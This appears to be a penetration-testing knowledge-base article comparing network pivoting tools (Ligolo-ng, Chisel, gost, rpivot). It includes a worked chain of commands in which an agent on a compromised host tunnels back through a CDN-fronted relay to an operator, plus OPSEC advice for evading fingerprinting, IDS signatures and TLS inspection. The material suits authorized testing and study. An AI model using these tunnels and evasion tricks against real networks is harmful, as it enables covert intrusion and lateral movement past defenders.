---
title: Modern tunnelling chains — Chisel, Ligolo-ng, gost
slug: modern-tunnelling-chains-chisel-ligolo-gost
aliases: ["modern-pivot-tunnels","chisel-ligolo-gost-comparison"]
date: 2026-06-08
---
{% raw %}

Pivoting in 2026 is not about a single tool — it is about composing transports. Chisel, Ligolo-ng, gost, and the venerable rpivot each solve a different slice of the problem. Pick the wrong one and you either burn detections or waste hours wrestling with SOCKS over a TUN that should have been L3 from the start. See [[pivoting-and-tunneling]] for the broader mental model.

## When to reach for which

### Ligolo-ng — full L3 over TUN
Ligolo-ng wins whenever you need real network reach: SMB with kerberos, RPC, MSSQL named pipes, anything that hates SOCKS. The agent on the compromised host opens a TLS connection back to the proxy, the operator binds a `ligolo` TUN interface, adds a route for the target subnet, and the kernel does the rest. No userland SOCKS wrapping, no proxychains tax.

Use it when:
- You need full TCP/UDP/ICMP, not just TCP.
- You are running tools that resolve DNS in-process and break under proxychains (impacket scripts, certipy, nxc with kerberos).
- The target subnet is large enough that per-port forwards are absurd.

Deep dive in [[ligolo-ng]].

### Chisel — fast SOCKS over HTTPS
Chisel is a single Go binary speaking WebSocket-tunnelled SOCKS5 over TLS. It is the right answer when the egress is HTTP(S)-only, you control a reverse proxy in front, and the tools you actually need (`nmap -sT`, `curl`, browser, BloodHound collector) tolerate SOCKS. Faster to deploy than ligolo, easier to hide behind nginx, but no L3. See [[chisel]].

### gost — protocol-flexible multiplexer
gost is the swiss army knife: relay chains across SOCKS5, HTTP CONNECT, TLS, WSS, QUIC, KCP, gRPC, with native chain syntax. Use it as the front-door listener (TLS+WSS behind Cloudflare), as a hop on a bastion, or as the glue that converts one transport to another. It rarely is the inner tunnel — it is the connective tissue.

### rpivot — legacy fallback
Pure Python, ancient, but still useful when you land on a Linux box with python2.7 and nothing else, or a constrained jumpbox where dropping a Go binary is noisy. Slow, TCP-only SOCKS4. Treat it as a break-glass option.

## Chaining example

Scenario: operator on a residential VPS, traffic must look like normal HTTPS, terminate on Cloudflare, land on a compromised DMZ jump host, then reach RFC1918 `10.50.0.0/16` behind it.

Layer 1 — gost listener fronted by Cloudflare, on a VPS with a clean cert (LE for `cdn.example.org`):

```bash
gost -L "wss://:443?cert=/etc/le/fullchain.pem&key=/etc/le/privkey.pem&path=/api/v2/sync"
```

Cloudflare proxies `cdn.example.org` to the VPS with WebSocket support enabled and rule set to whitelist your operator ASN.

Layer 2 — on the operator box, dial out through gost to the VPS, exposing a local relay:

```bash
gost -L tcp://127.0.0.1:11601 \
     -F "wss://cdn.example.org:443?path=/api/v2/sync&serverName=cdn.example.org"
```

Layer 3 — Ligolo-ng proxy listens on the VPS, but on `127.0.0.1:11601` reached via the gost tunnel:

```bash
./proxy -selfcert -laddr 0.0.0.0:11601
```

Layer 4 — agent on the compromised jump host connects back. Egress is locked to 443 outbound to the CDN edge only:

```powershell
.\agent.exe -connect cdn.example.org:443 -ignore-cert
```

(Replace `-ignore-cert` with a pinned cert in real engagements; see OPSEC below.)

Layer 5 — operator binds the TUN and routes the target subnet:

```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.50.0.0/16 dev ligolo
# inside ligolo session:
session 1
ifconfig
start
```

Now `nxc smb 10.50.7.42 -u svc_sql -k --kdcHost 10.50.0.10` works as if you were on the LAN. Compare with the dumber forms in [[ssh-tunneling]] and [[port-forwarding]].

## OPSEC notes

- **TLS certs**: never ship the default `-selfcert` flag into production engagements. Defenders fingerprint Ligolo-ng on its self-signed CN. Issue a real LE cert for the front-door FQDN; for the inner Ligolo hop use a long-lived private CA cert and pin it on the agent with `-servercert <sha256>`.
- **Certificate pinning**: agents that accept any cert leak you to TLS-MITM appliances. Compile in the SPKI hash for the inner cert. Pinning also stops a defender swapping the cert after seizing the VPS.
- **Fingerprintable headers**: Chisel sends a `Sec-WebSocket-Protocol: chisel-v3` header that ends up in flow logs; either patch it out at build time or terminate it behind nginx with header rewrite. gost has its own version string in TLS ALPN; override with `?alpn=h2,http/1.1`.
- **JA3/JA4**: Go's default TLS client has a recognisable JA3. Front with nginx or use uTLS-patched forks for outbound legs that traverse JA3-aware inspection.
- **Path discipline**: pick CDN paths that mimic the real origin's API (`/api/v2/sync`, not `/ws`). Static paths like `/chisel` are an IDS signature.
- **Egress assumptions**: review [[osep-network-filter-bypass-techniques]] before assuming 443 outbound is free; many enterprises break and inspect TLS, in which case the inner Ligolo TLS must look like benign HTTPS, not a nested TLS handshake inside WSS — that nesting is itself anomalous.

Pick the tunnel for the traffic shape, not for the tool you used last engagement.

{% endraw %}
